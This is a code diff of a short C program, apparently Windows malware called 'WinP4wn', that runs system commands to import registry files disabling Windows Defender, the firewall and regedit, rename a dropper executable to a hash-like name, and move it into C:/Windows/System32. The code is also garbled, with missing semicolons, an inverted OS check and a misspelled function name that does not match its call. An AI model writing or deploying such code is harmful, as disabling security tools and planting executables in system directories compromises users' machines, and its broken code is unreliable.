@@ -5,6 +5,8 @@
 void getos(int argc, char** argv[]) {
 #ifndef __WIN32__
 #define OS __WIN32__
+  /** move into c:/temp for local instance */
+  system("cd %Temp% && mkdir winp4wn && cd winp4wn");
   /** disable some stuff like winfirewall and regedit */
   system("reg /s registries/disabledef.reg");
   system("reg /s registries/disablereg.reg");
@@ -12,14 +14,19 @@ void getos(int argc, char** argv[]) {
   system("ren Win32.WinP4wn.dropper.exe 27cacc006aaf5bdd2a8e6b9b94711548.exe")
   /** Using the sysreg command to import a registry hive with administrative settings xD */
   system("reg load HKLM/Software/WinP4ned 'NTUSER.DAT' /y [/c]")
+  /** fetch latest gp changes from the local replication */
+  system("gpupdate /force")
 #else
 #error "WinP4wn does only work on Windooze!"
 #endif
 }
 
+void aftereffetc(int argc, char** argv[]) {
+  system("move %Temp%/winp4wn/27cacc006aaf5bdd2a8e6b9b94711548.exe C:/Windows/System32")
+}
+
 int main(int argc, char** argv[]) {
   getos();
-  /** fetch latest gp changes from the local replication */
-  system("gpupdate /force")
+  aftereffect();
   return 0;
 }
